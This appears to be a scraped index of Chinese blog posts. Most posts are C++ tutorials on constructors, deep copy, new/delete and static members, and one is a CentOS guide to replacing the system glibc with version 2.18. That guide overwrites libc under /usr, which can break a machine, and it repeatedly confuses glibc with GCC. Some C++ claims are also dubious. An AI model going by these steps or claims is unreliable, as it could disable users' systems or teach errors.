1234567891011121314151617181920212223242526272829303132333435363738394041#include "Array.h"Array::Array(int length) { cout &lt;&lt; "有参构造函数被调用" &lt;&lt; endl; if (length &lt; 0) { length = 0; } this-&gt;m_length = length; this-&gt;m_space = new int[length];}Array::Array(const Array&amp; array) { cout &lt;&lt; "拷贝构造函数被调用" &lt;&lt; endl; // 深拷贝，单独分配内存空间 this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; }}Array::~Array() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}void Array::setData(int index, int value) { this-&gt;m_space[index] = value;}int Array::getData(int index) { return this-&gt;m_space[index];}int Array::length() { return this-&gt;m_length;} main.cpp 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include "Array.h"using namespace std;int main() { // 自动调用构造函数初始化数组 Array array1(5); // 数组赋值 for (int i = 0; i &lt; array1.length(); i++) { array1.setData(i, i); } // 打印数组 for (int i = 0; i &lt; array1.length(); i++) { cout &lt;&lt; "array1[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array1.getData(i) &lt;&lt; endl; } // 自动调用拷贝构造函数初始化数组（属于深拷贝） Array array2 = array1; // 打印数组 for (int i = 0; i &lt; array2.length(); i++) { cout &lt;&lt; "array2[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array2.getData(i) &lt;&lt; endl; } return 0;} 执行命令编译 C/C++ 程序后，控制台输出的日志信息如下： 1234567891011121314&gt; cl main.cpp Array.cpp /EHsc用于 x86 的 Microsoft (R) C/C++ 优化编译器 19.29.30136 版版权所有(C) Microsoft Corporation。保留所有权利。main.cppArray.cpp正在生成代码...Microsoft (R) Incremental Linker Version 14.29.30136.0Copyright (C) Microsoft Corporation. All rights reserved./out:main.exemain.objArray.obj 运行编译后的 C/C++ 程序： 12345678910111213141516&gt; main有参构造函数被调用array1[0] = 0array1[1] = 1array1[2] = 2array1[3] = 3array1[4] = 4拷贝构造函数被调用array2[0] = 0array2[1] = 1array2[2] = 2array2[3] = 3array2[4] = 4析构函数被调用析构函数被调用 参考博客 模仿 Visual Studio - 命令行编译 C/C++ 程序 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ 开发工具"},{title:"C++ 入门基础之五",url:"/posts/a35089f6.html",text:'浅拷贝与深拷贝 C++ 提供的默认拷贝构造函数，可以完成对象的数据成员值简单的复制（浅拷贝） 对象的数据资源是由指针指向的堆，C++ 提供的默认拷贝构造函数仅作指针值复制（浅拷贝） 浅拷贝问题剖析 问题抛出思考以下的代码为什么会异常终止运行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char *p; int len;public: Name(const char *name) { cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; int length = strlen(name); p = (char *) malloc(length + 1); strcpy(p, name); len = length; } ~Name() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; if (p != NULL) { free(p); p = NULL; len = 0; } } char *getP() const { return p; } int getLen() const { return len; }};int main() { Name obj1("Peter"); Name obj2 = obj1; // 自动调用C++提供的默认拷贝构造函数，属于浅拷贝 cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj2.name: " &lt;&lt; obj2.getP() &lt;&lt; ", obj2.len: " &lt;&lt; obj2.getLen() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234567有参构造函数被调用了obj1.name: Peter, obj1.len: 5obj2.name: Peter, obj2.len: 5析构函数被调用了析构函数被调用了Process finished with exit code 134 (interrupted by signal 6: SIGABRT) 问题分析由于在上述的代码中，没有自定义拷贝构造函数，使用的是 C++ 编译器提供的默认拷贝构造函数，因此程序异常终止运行。造成程序异常终止运行的根本原因是，C++ 提供的默认拷贝构造函数属于浅拷贝，当程序运行结束之前，在第二次调用上面的析构函数时会出现错误（同一块内存空间被释放了两次），底层的分析图解可以看这里。 问题解决显式编写自定义的拷贝构造函数，通过实现深拷贝（申请新的内存空间）来解决上述的问题，底层的分析图解可以看这里。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char *p; int len;public: Name(const char *name) { cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; int length = strlen(name); p = (char *) malloc(length + 1); strcpy(p, name); len = length; } // 深拷贝的实现 Name(const Name &amp;name) { cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; int length = name.getLen(); p = (char *) malloc(length + 1); strcpy(p, name.getP()); len = length; } ~Name() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; if (p != NULL) { free(p); p = NULL; len = 0; } } char *getP() const { return p; } int getLen() const { return len; }};int main() { Name obj1("Peter"); Name obj3 = obj1; // 自动调用自定义的拷贝构造函数（深拷贝） cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123456有参构造函数被调用了拷贝构造函数被调用了obj1.name: Peter, obj1.len: 5obj3.name: Peter, obj3.len: 5析构函数被调用了析构函数被调用了 特别注意： 在以下的代码中，obj3 = obj1; 依旧属于浅拷贝（这里不会自动调用拷贝构造函数），最终程序也会异常终止运行。若希望解决该问题，需要重载 C++ 的 = 操作符，这里暂时不展开讨论。 12345678int main() { Name obj1("Peter"); Name obj3("Tom"); obj3 = obj1; // 浅拷贝，不会自动调用拷贝构造函数 cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12345678有参构造函数被调用了有参构造函数被调用了obj1.name: Peter, obj1.len: 5obj3.name: Peter, obj3.len: 5析构函数被调用了析构函数被调用了Process finished with exit code 134 (interrupted by signal 6: SIGABRT) 对象的动态建立和释放使用类名定义的对象都是静态的（如 Teacher t(30);），在程序运行过程中，对象所占的内存空间是不能随时释放的，只有在程序运行结束之后才会被释放。但有时候用户希望在需要用到对象时才建立对象，在不需要用该对象时就撤销它，释放它所占的内存空间以供别的数据使用，这样可提高内存空间的利用率。在 C++ 中，可以用 new 运算符动态建立对象，用 delete 运算符动态撤销对象。 new 和 delete 介绍在软件开发过程中，常常需要动态地分配和撤销内存空间，例如对动态链表中结点的插入与删除。在 C 语言中是利用库函数 malloc() 和 free() 来分配和撤销内存空间的。C++ 提供了较简便而功能较强的运算符 new 和 delete 来取代 malloc() 和 free() 函数。值得注意的是，new 和 delete 是运算符，不是函数，因此执行效率更高。虽然为了与 C 语言兼容，C++ 仍保留 malloc() 和 free() 函数，但建议用户不要使用 malloc() 和 free() 函数，而是使用 new 和 delete 运算符。 new 和 delete 的基础语法 new 运算符的简单使用例子如下： new int;：开辟一个存放整数的内存空间，返回一个指向该内存空间的地址（即指针） new int(100);：开辟一个存放整数的空间，并指定该整数的初值为 100，返回一个指向该内存空间的地址（即指针） new char[10];：开辟一个存放字符数组（包括 10 个元素）的空间，返回首元素的地址（即指针） new int[5][4];：开辟一个存放二维整型数组（大小为 5*4）的空间，返回首元素的地址（即指针） float *p = new float (3.14159);：开辟一个存放单精度数的空间，并指定该实数的初值为 3.14159，将返回的该空间的地址赋给指针变量 值得注意的是，用 new 分配数组内存空间时不能指定初值，如果由于内存不足等原因而导致无法正常分配内存空间，那么 new 会返回一个空指针 NULL，用户可以根据该指针的值判断内存空间是否分配成功。 new 和 delete 的使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;iostream&gt;using namespace std;class Teacher {private: int _age;public: Teacher(int age) { this-&gt;_age = age; cout &lt;&lt; "构造函数被调用" &lt;&lt; endl; } ~Teacher() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; } void setAget(int age) { this-&gt;_age = age; } int getAge() { return this-&gt;_age; }};// C语言分配基础类型void functionA() { int *p = (int *) malloc(sizeof(int)); *p = 3; cout &lt;&lt; "functionA -&gt; p = " &lt;&lt; *p &lt;&lt; endl; free(p);}// C++分配基础类型void functionB() { int *a = new int; *a = 3; cout &lt;&lt; "functionB -&gt; a = " &lt;&lt; *a &lt;&lt; endl; delete a; int *b = new int(30); cout &lt;&lt; "functionB -&gt; b = " &lt;&lt; *b &lt;&lt; endl; delete b;}// C语言分配数组类型void functionC() { char *p = (char *) malloc(sizeof(char) * 3); p[0] = \'a\'; p[1] = \'b\'; p[2] = \'c\'; cout &lt;&lt; "functionC -&gt; p = " &lt;&lt; p[0] &lt;&lt; p[1] &lt;&lt; p[2] &lt;&lt; endl; free(p);}// C++分配数组类型void functionD() { char *p = new char[3]; p[0] = \'e\'; p[1] = \'f\'; p[2] = \'g\'; cout &lt;&lt; "functionD -&gt; p = " &lt;&lt; p[0] &lt;&lt; p[1] &lt;&lt; p[2] &lt;&lt; endl; delete []p;}// C语言分配对象void functionE() { // 这里不会自动调用类的构造函数和析构函数 Teacher *p = (Teacher *) malloc(sizeof(Teacher)); p-&gt;setAget(33); cout &lt;&lt; "functionE -&gt; age = " &lt;&lt; p-&gt;getAge() &lt;&lt; endl; free(p);}// C++分配对象void functionF() { // new和delete会分别自动调用类的构造函数和析构函数 Teacher *p = new Teacher(35); cout &lt;&lt; "functionF -&gt; age = " &lt;&lt; p-&gt;getAge() &lt;&lt; endl; delete p;}int main() { functionA(); functionB(); functionC(); functionD(); functionE(); functionF(); return 0;} 程序运行输出的结果如下： 123456789functionA -&gt; p = 3functionB -&gt; a = 3functionB -&gt; b = 30functionC -&gt; p = abcfunctionD -&gt; p = efgfunctionE -&gt; age = 33构造函数被调用functionF -&gt; age = 35析构函数被调用 上面的 Teacher *p = new Teacher(35); 这种写法，是将两个语句（定义指针变量和使用 new 建立新对象）合并为一个语句，并指定初值，在调用对象时，既可以通过对象名，也可以通过指针。在执行 new 运算符时，如果内存空间不足，无法开辟所需的内存空间，目前大多数 C++ 编译器都会返回一个 0 指针值。只要检测返回值是否为 0，就可判断内存空间是否分配成功。ANSI C++ 标准提出，在执行 new 出现故障时，就抛出一个异常，用户可根据异常进行相关处理，但 C++ 标准仍然允许在出现 new 故障时返回 0 指针值。值得注意的是，不同的编译器对 new 故障的处理方法是不同的。当不再需要使用由 new 建立的对象时，可以用 delete 运算符予以释放，此后程序不能再使用该对象。如果用一个指针变量先后指向了不同的动态对象，应注意指针变量的当前指向，以避免释放错了对象。在执行 delete 运算符时，在释放内存空间之前，会自动调用类的析构函数，完成有关善后清理工作。 静态成员变量静态成员变量的概念 静态成员局部于类，它不是对象成员 在类外访问静态成员变量时，可以使用 类名 :: 作为限定词，或通过对象访问 关键字 static 可以用于声明一个类的成员，静态成员提供了一个同类对象的共享机制 将一个类的成员声明为 static 时，这个类无论有多少个对象被创建，这些对象都共享这个 static 成员 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;using namespace std;class Counter {private: // 声明静态成员变量 static int num;public : // 成员函数访问静态成员变量 void setNum(int i) { num = i; } void showNum() { cout &lt;&lt; num &lt;&lt; endl; }};// 定义静态成员变量，这里不是简单的变量赋值，更重要的是告诉C++编译器，给静态成员变量分配内存int Counter::num = 0;int main() { Counter a, b; a.showNum(); b.showNum(); a.setNum(10); a.showNum(); b.showNum(); return 0;} 程序运行输出的结果如下： 1234001010 静态成员变量的使用123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;class Counter {public: int mem; // 公有成员变量 static int smem; // 公有静态成员变量public : Counter(int num) { mem = num; }};// 定义静态成员变量，这里不是简单的变量赋值，更重要的是告诉C++编译器，给静态成员变量分配内存int Counter::smem = 0;int main() { Counter c(5); for (int i = 0; i &lt; 5; i++) { // 访问静态成员变量的方法1（通过类名直接访问） Counter::smem += i; cout &lt;&lt; "Counter::smem = "&lt;&lt; Counter::smem &lt;&lt; endl; } // 访问静态成员变量的方法2（通过对象访问） cout &lt;&lt; "c.smem = " &lt;&lt; c.smem &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123456Counter::smem = 0Counter::smem = 1Counter::smem = 3Counter::smem = 6Counter::smem = 10c.smem = 10 静态成员函数静态成员函数的概念 静态成员函数、静态成员变量都属于类的 静态成员函数都是以关键字 static 声明 在类外调用静态成员函数时，可以使用 类名 :: 作为限定词，或通过对象访问 静态成员函数提供不依赖于类数据结构的共同操作，它没有 this 指针，而普通成员函数包含一个指向具体对象的 this 指针 静态成员函数的使用值得一提的是，在静态成员函数中，不能访问普通成员变量和调用普通成员函数。这是因为静态成员函数属于整个类的，它没办法区分普通成员变量和普通成员函数是属于哪个具体的对象；同时在静态成员函数内，不能使用 this 指针。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Counter {private: int num;public: // 声明静态成员函数 static int getNum(Counter *p); static void setNum(int i, Counter *p);};// 定义静态成员函数int Counter::getNum(Counter *p) { return p-&gt;num;}void Counter::setNum(int i, Counter *p) { p-&gt;num = i;}int main() { Counter obj; // 访问静态成员函数的方法1（通过类名直接访问） Counter::setNum(1, &amp;obj); cout &lt;&lt; "num = " &lt;&lt; Counter::getNum(&amp;obj) &lt;&lt; endl; // 访问静态成员函数的方法2（通过对象访问） obj.setNum(3, &amp;obj); cout &lt;&lt; "num = " &lt;&lt; obj.getNum(&amp;obj) &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12num = 1num = 3 C++ 面向对象模型初探对象模型概述C++ 对象模型可以概括为以下两部分： 对于各种特性支持的底层实现机制 语言中直接支持面向对象程序设计的部分，主要涉及如构造函数、析构函数、虚函数、继承（单继承、多继承、虚继承）、多态等 在 C 语言中，“数据” 和 “处理数据的操作（函数）” 是分开来声明的，也就是说，语言本身并没有支持 “数据和函数” 之间的关联性。在 C++ 中，通过抽象数据类型 ADT（Abstract Data Type），在类中定义数据和函数来实现数据和函数直接的绑定。概括来说，在 C++ 类中有两种成员数据：static、nonstatic，三种成员函数：static、nonstatic、virtual。 属性和函数的处理机制C++ 中的 Class 从面向对象理论出发，将变量（属性）和函数（方法）集中定义在一起，用于描述现实世界中的类。从计算机的角度，程序依然由数据段和代码段构成。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;struct S1 { int i; int j; int k;};struct S2 { int i; int j; int k; static int m;};class C1 {public: int i; int j; int k;};class C2 {public: int i; int j; int k; static int m;public: int getK() const { return k; } void setK(int val) { k = val; }};int main() { printf("s1:%d \\n", sizeof(S1)); printf("s2:%d \\n", sizeof(S2)); printf("c1:%d \\n", sizeof(C1)); printf("c2:%d \\n", sizeof(C2)); return 0;} 程序运行输出的结果如下： 1234s1:12s2:12c1:12c2:12 通过上面的案例，可以得知 C++ 类对象中的成员变量和成员函数是分开存储的，C 语言中的内存四区模型仍然有效。C++ 中类的普通成员函数都隐式包含一个指向当前对象的 this 指针。 静态成员变量：存储于全局数据区中 普通成员变量：存储于对象中，与 struct 变量有相同的内存布局和字节对齐方式 成员函数：存储于代码段中 this 指针的使用 值得一提的是，当使用 const 修饰类成员函数时，成员函数不能修改被调用对象的值，这是因为此时 const 本质上修饰的是 this 指针，间接也说明了 const 与 static 关键字不能同时修饰类成员函数，示例代码如下： 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { // _cm = 10; 是错误写法，对象的_cm属性值不能被改变 return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); // 打印结果为8 return 0;} 全局函数与成员函数的使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;using namespace std;class Test{public: int a; int b;public: Test(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } ~Test() { }public: void printT() { cout &lt;&lt; "a:" &lt;&lt; a &lt;&lt; " b: " &lt;&lt; b &lt;&lt; endl; } Test testAdd(Test&amp; t2) { Test tmp(this-&gt;a + t2.a, this-&gt;b + t2.b); return tmp; } //t1.testAdd2(t2); //返回一个引用，相当于返回自身 //返回t1这个元素，this就是&amp;t1 Test&amp; testAdd2(Test&amp; t2) { this-&gt;a = this-&gt;a + t2.a; this-&gt;b = this-&gt;b + t2.b; return *this; //把 *(&amp;t1) 又回到了 t1元素 }};// 全局函数Test testAdd(Test&amp; t1, Test&amp; t2){ Test tmp; tmp.a = t1.a + t2.a; tmp.b = t1.b + t2.b; return tmp;}// 全局函数void printT(Test* pT){ cout &lt;&lt; "a:" &lt;&lt; pT-&gt;a &lt;&lt; " b: " &lt;&lt; pT-&gt;b &lt;&lt; endl;}int main(){ Test t1(1, 2); Test t2(3, 4); // 调用全局函数 Test t3; t3 = testAdd(t1, t2); printT(&amp;t3); // 调用成员函数 Test t4 = t1.testAdd(t2); // 将匿名对象直接转化成t4 t4.printT(); Test t5; t5 = t1.testAdd(t2); // 将匿名对象复制给t5 t5.printT(); t1.testAdd2(t2); // 函数内部使用了this指针 t1.printT(); return 0;} 程序运行输出的结果如下： 1234a:4 b: 6a:4 b: 6a:4 b: 6a:4 b: 6 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"Linux 解决 libc.so.6 version GLIBC_2.18 not found 的问题",url:"/posts/15a7083d.html",text:'错误日志信息 1/lib64/libc.so.6: version \'GLIBC_2.18\' not found 系统环境 12CentOS Linux release 7.9.2009 (Core)Linux 3.10.0-1160.45.1.el7.x86_64 #1 SMP Wed Oct 13 17:20:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 查看当前 GLIBC 的版本 123456789101112131415161718192021# strings /lib64/libc.so.6 | grep GLIBCGLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17 问题分析 通过查看当前 GLIBC 的版本，可以发现目前系统中最高只支持 GLIBC_2.17，当需要安装依赖 GLIBC_2.18 的软件时，就会出现 libc.so.6: version \'GLIBC_2.18\' not found 的错误信息。glibc 是 GNU 发布的 libc 库，即 C 运行库。glibc 是 Linux 系统中最底层的 API，几乎其它任何运行库都会依赖于 glibc。值得一提的是，glibc 除了封装了 Linux 操作系统所提供的系统服务外，它本身也提供了许多其它一些必要功能服务的实现。对于 CentOS 这样的系统，为了追求稳定性（这个值得商榷）往往各种库版本都很低，比如 CentOS 6.5 甚至 CentOS 7.0 自带的还是 glibc 2.12, 而 Ubuntu 14.04 自带 glibc2.19。如果升级 glibc 到一个太新的版本，可能会影响 CentOS 的稳定运行，所以不建议随便升级 glibc 的版本。 解决思路 a) 手动编译安装高版本的 gcc b) 在低版本的系统编译自己的软件，前提是自己的软件确实不需要使用新版 GCC 才支持的特性 c) 利用容器技术（如 Docker），在低版本的操作系统内，轻量级的隔离出一个虚拟运行环境，适应自己的软件 (adsbygoogle = window.adsbygoogle || []).push({}); 编译安装 GCC glibc 的各个版本可以在这里下载。特别注意，在条件允许的情况下，强烈建议在执行下述的 make install 命令之前，全量备份整个 Linux 系统，防止因系统文件意外被破坏，导致系统在启动或运行期间出现崩溃的问题。 1234567891011121314151617181920212223# 下载glibc-2.18# curl -O http://ftp.gnu.org/gnu/glibc/glibc-2.18.tar.gz# 解压文件# tar zxf glibc-2.18.tar.gz# 进入解压目录# cd glibc-2.18# 建立输出目录，用于存放编译时所有产生的中间文件# mkdir build# 进入输出目录# cd build# 执行配置# ../configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --enable-checking=release --enable-languages=c,c++# 编译GCC，指定编译使用的线程数为8，编译耗时较长# make -j8# 安装GCC（切记谨慎执行）# make install 验证 GCC 的版本是否升级成功 如果在下面的输出结果中，出现 GLIBC_2.18，则代表 GCC 的版本升级成功。 12345678910111213141516171819202122# strings /lib64/libc.so.6 | grep GLIBCGLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17GLIBC_2.18 或者查看 ldd 的版本 12345# ldd --versionldd (GNU libc) 2.18Copyright (C) 2013 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 或者查看系统的库文件 123456789# 查看系统的libc.so库文件# ls /usr/lib64/libc-*.so -al-rwxr-xr-x. 1 root root 2156592 10月 14 02:29 /usr/lib64/libc-2.17.so-rwxr-xr-x. 1 root root 10232696 10月 24 14:52 /usr/lib64/libc-2.18.so# 查看系统的libc.so库文件# ls /usr/lib64/libc.so* -al-rw-r--r--. 1 root root 253 10月 24 14:51 /usr/lib64/libc.solrwxrwxrwx. 1 root root 12 10月 24 14:52 /usr/lib64/libc.so.6 -&gt; libc-2.18.so 解决误删 libc.so.6 库文件的问题 在上述的操作中，若误删了 libc.so.6 库文件，会导致系统大多数命令不可用（例如：ls、cp、ln）。此时千万不要随便重启系统，缺少 libc.so.6 库文件很容易导致系统无法正常启动，其次也尽量不要关闭正在运行的终端，因为很多东西还可以补救，建议参考以下步骤重新创建 libc.so.6 库文件。 123456789101112# 查看系统可用的libc库文件# ls /usr/lib64/libc-*.so -al-rwxr-xr-x. 1 root root 2156592 10月 14 02:29 /usr/lib64/libc-2.17.so# 通过系统环境变量LD_PRELOAD导入可用的libc库文件# export LD_PRELOAD=/usr/lib64/libc-2.17.so# 利用可用的libc库文件，创建新的libc.so.6库文件# ln -s -f /usr/lib64/libc-2.17.so /usr/lib64/libc.so.6# 取消设置系统环境变量LD_PRELOAD# unset LD_PRELOAD 参考博客 Linux（CentOS）GLIBC 出错的补救方式 解决 libc.so.6: version ‘GLIBC_2.18’ not found 的问题 Linux/Centos 下 /lib64/libc.so.6: version ‘GLIBC_2.14’ not found var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"C++ 入门基础之四",url:"/posts/beb2ebb3.html",text:'学习目标 C++ 面向对象的基础模型 C++ 编译器管理类和对象的机制 C++ 编译器对类对象的生命周期管理，包括对象的创建、使用、销毁等 类和对象基本概念 a) 类、对象、成员变量、成员函数 b) 面向对象三大概念：封装、继承、多态 类的封装封装（Encapsulation）： a) 封装，是面向对象程序设计最基本的特性。把数据（属性）和函数（操作）合成一个整体，对数据和函数进行访问控制，这在计算机世界中是用类与对象实现的。 b) 封装，把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。 C++ 中类的封装： 成员变量：C++ 中用于表示类属性的变量 成员函数：C++ 中用于表示类行为的函数 类成员的访问控制在 C++ 中可以给成员变量和成员函数定义访问级别： private：修饰的成员变量和成员函数，只能在类的内部被访问 public：修饰的成员变量和成员函数，可以在类的内部和类的外部被访问 protected：修饰的成员变量和成员函数，可以在派生类（继承的子类）的内部访问，不能在派生类的外部被访问 特别注意：若在类中没有声明访问控制级别的成员变量和成员函数，默认都是 private 访问级别的 基于类成员的访问控制，计算圆形面积的示例代码如下： 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {private: double m_r; // 圆形的半径 double m_s; // 圆形的面积public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "圆形的面积是：" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} struct 和 class 的区别struct 和 class 关键字的区别如下： 在用 class 定义类时，所有成员的默认属性为 private 在用 struct 定义类时，所有成员的默认属性为 public 类的声明与类的实现一起写123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {private: double m_r; // 圆形的半径 double m_s; // 圆形的面积public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "圆形的面积是：" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12请输入圆形的半径：30圆形的面积是：2826 类的声明与类的实现分开写在企业开发中，由于项目结构比较庞大，一般都会将类的声明和类的实现分开写在不同的源文件中。 Teacher.h 头文件，声明了 Teacher 类的成员变量和成员函数；使用 #ifndef、#define、#endif 指令，是为了防止 Teacher.h 头文件被多次引用时 C++ 编译器编译失败，也可以直接使用 #pragma once 指令来替代。 1234567891011121314151617181920#ifndef TEACHER_H#define TEACHER_Hclass Teacher {private: char *_name; int _age;public: const char *getName() const; void setName(char *name); int getAge() const; void setAge(int age);};#endif Teacher.cpp 源文件，实现了在 Teacher.h 头文件中定义的成员函数 1234567891011121314151617181920#include &lt;iostream&gt;#include "Teacher.h"using namespace std;const char *Teacher::getName() const { return this-&gt;_name;}void Teacher::setName(char *name) { this-&gt;_name = name;}int Teacher::getAge() const { return this-&gt;_age;}void Teacher::setAge(int age) { this-&gt;_age = age;} Main.cpp 源文件 12345678910111213#include &lt;iostream&gt;#include "Teacher.h"using namespace std;int main() { char name[32] = "Peter"; Teacher teacher; teacher.setAge(10); teacher.setName(name); cout &lt;&lt; "age: " &lt;&lt; teacher.getAge() &lt;&lt; endl; cout &lt;&lt; "name: " &lt;&lt; teacher.getName() &lt;&lt; endl;} 程序运行的输出结果如下： 12age: 10name: Peter 对象的构造和析构析构函数析构函数的定义析构函数的定义： C++ 中的类可以定义一个特殊的成员函数来清理对象，这个特殊的成员函数叫做析构函数 析构函数的名称与类的名称是完全相同的，只是在前面加了个波浪号 ~ 作为前缀，它没有任何参数，也没有任何返回类型的声明 析构函数有助于在跳出程序（比如关闭文件、释放内存等）前释放资源 析构函数在对象销毁时会自动被调用 析构函数的调用： C++ 编译器会自动调用析构函数 析构函数的声明12345678910111213141516171819#include &lt;iostream&gt;using namespace std;class Teacher {public: // 析构函数 ~Teacher() { cout &lt;&lt; "调用析构函数" &lt;&lt; endl; }};int main() { Teacher teacher; return 0;} 程序运行输出的结果如下： 1调用析构函数 构造函数创建一个对象时，常常需要做某些初始化的工作，例如对数据成员赋初值。必须注意，类的数据成员是不能在声明类时初始化的。为了解决这个问题，C++ 编译器提供了构造函数（Constructor）来处理对象的初始化。构造函数是一种特殊的成员函数，与其他成员函数不同，不需要用户来调用它，而是在建立对象时自动被调用。 构造函数的定义构造函数的定义： C++ 中的类可以定义与类名相同的特殊成员函数，这种与类名相同的成员函数叫做构造函数 构造函数在定义时可以有参数 构造函数没有任何返回类型的声明 构造函数可用于为某些成员变量设置初始值 构造函数的调用： 自动调用：一般情况下 C++ 编译器会自动调用构造函数 手动调用：在一些特定的情况下，需要手工调用构造函数 构造函数的分类构造函数一般分为三类：无参数的构造函数、带参数的构造函数、拷贝构造函数（赋值构造函数）。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;class Test {private: int _a; int _b;public: // 无参数的构造函数 Test() { _a = 1; _b = 2; } // 带参数的构造函数 Test(int a, int b) { _a = a; _b = b; } // 拷贝构造函数（赋值构造函数） Test(const Test 